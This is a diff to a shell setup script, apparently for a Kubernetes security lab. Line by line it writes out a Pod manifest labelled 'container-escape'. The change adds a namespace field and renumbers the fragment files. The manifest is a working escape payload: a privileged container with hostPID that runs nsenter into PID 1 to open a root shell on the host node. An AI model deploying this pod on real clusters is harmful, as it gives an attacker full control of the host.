@@ -33,19 +33,20 @@ sudo [ ! -f $ROOT_DIR/pub-ip ] && echo $PUBLIC_IP > $ROOT_DIR/pub-ip
 sudo [ ! -f $ROOT_DIR/pod-esc01 ] && echo 'apiVersion: v1' >                                                                                           $ROOT_DIR/pod-esc01
 sudo [ ! -f $ROOT_DIR/pod-esc02 ] && echo 'kind: Pod' >                                                                                                $ROOT_DIR/pod-esc02
 sudo [ ! -f $ROOT_DIR/pod-esc03 ] && echo 'metadata:' >                                                                                                $ROOT_DIR/pod-esc03
-sudo [ ! -f $ROOT_DIR/pod-esc04 ] && echo '  name: priv-and-hostpid-exec-pod' >                                                                       $ROOT_DIR/pod-esc04
-sudo [ ! -f $ROOT_DIR/pod-esc05 ] && echo '  labels:' >                                                                                                $ROOT_DIR/pod-esc05
-sudo [ ! -f $ROOT_DIR/pod-esc06 ] && echo '    app: container-escape' >                                                                                $ROOT_DIR/pod-esc06
-sudo [ ! -f $ROOT_DIR/pod-esc07 ] && echo 'spec:' >                                                                                                    $ROOT_DIR/pod-esc07
-sudo [ ! -f $ROOT_DIR/pod-esc08 ] && echo '  hostPID: true' >                                                                                          $ROOT_DIR/pod-esc08
-sudo [ ! -f $ROOT_DIR/pod-esc09 ] && echo '  containers:' >                                                                                            $ROOT_DIR/pod-esc09
-sudo [ ! -f $ROOT_DIR/pod-esc10 ] && echo '  - name: priv-and-hostpid-pod' >                                                                           $ROOT_DIR/pod-esc10
-sudo [ ! -f $ROOT_DIR/pod-esc11 ] && echo '    image: ubuntu' >                                                                                        $ROOT_DIR/pod-esc11
-sudo [ ! -f $ROOT_DIR/pod-esc12 ] && echo '    tty: true' >                                                                                            $ROOT_DIR/pod-esc12
-sudo [ ! -f $ROOT_DIR/pod-esc13 ] && echo '    securityContext:' >                                                                                     $ROOT_DIR/pod-esc13
-sudo [ ! -f $ROOT_DIR/pod-esc14 ] && echo '      privileged: true' >                                                                                   $ROOT_DIR/pod-esc14
-sudo [ ! -f $ROOT_DIR/pod-esc15 ] && echo '    command: [ "nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash" ]' > $ROOT_DIR/pod-esc15
+sudo [ ! -f $ROOT_DIR/pod-esc04 ] && echo '  name: priv-and-hostpid-exec-pod' >                                                                        $ROOT_DIR/pod-esc04
+sudo [ ! -f $ROOT_DIR/pod-esc05 ] && echo '  namespace: default' >                                                                                     $ROOT_DIR/pod-esc05
+sudo [ ! -f $ROOT_DIR/pod-esc06 ] && echo '  labels:' >                                                                                                $ROOT_DIR/pod-esc06
+sudo [ ! -f $ROOT_DIR/pod-esc07 ] && echo '    app: container-escape' >                                                                                $ROOT_DIR/pod-esc07
+sudo [ ! -f $ROOT_DIR/pod-esc08 ] && echo 'spec:' >                                                                                                    $ROOT_DIR/pod-esc08
+sudo [ ! -f $ROOT_DIR/pod-esc09 ] && echo '  hostPID: true' >                                                                                          $ROOT_DIR/pod-esc09
+sudo [ ! -f $ROOT_DIR/pod-esc10 ] && echo '  containers:' >                                                                                            $ROOT_DIR/pod-esc10
+sudo [ ! -f $ROOT_DIR/pod-esc11 ] && echo '  - name: priv-and-hostpid-pod' >                                                                           $ROOT_DIR/pod-esc11
+sudo [ ! -f $ROOT_DIR/pod-esc12 ] && echo '    image: ubuntu' >                                                                                        $ROOT_DIR/pod-esc12
+sudo [ ! -f $ROOT_DIR/pod-esc13 ] && echo '    tty: true' >                                                                                            $ROOT_DIR/pod-esc13
+sudo [ ! -f $ROOT_DIR/pod-esc14 ] && echo '    securityContext:' >                                                                                     $ROOT_DIR/pod-esc14
+sudo [ ! -f $ROOT_DIR/pod-esc15 ] && echo '      privileged: true' >                                                                                   $ROOT_DIR/pod-esc15
+sudo [ ! -f $ROOT_DIR/pod-esc16 ] && echo '    command: [ "nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash" ]' > $ROOT_DIR/pod-esc16
 
 sudo cat $ROOT_DIR/pod-esc* > $ROOT_DIR/pod-esc.yaml
 
-sudo rm $ROOT_DIR/pod-esc{01..15}
+sudo rm $ROOT_DIR/pod-esc{01..16}
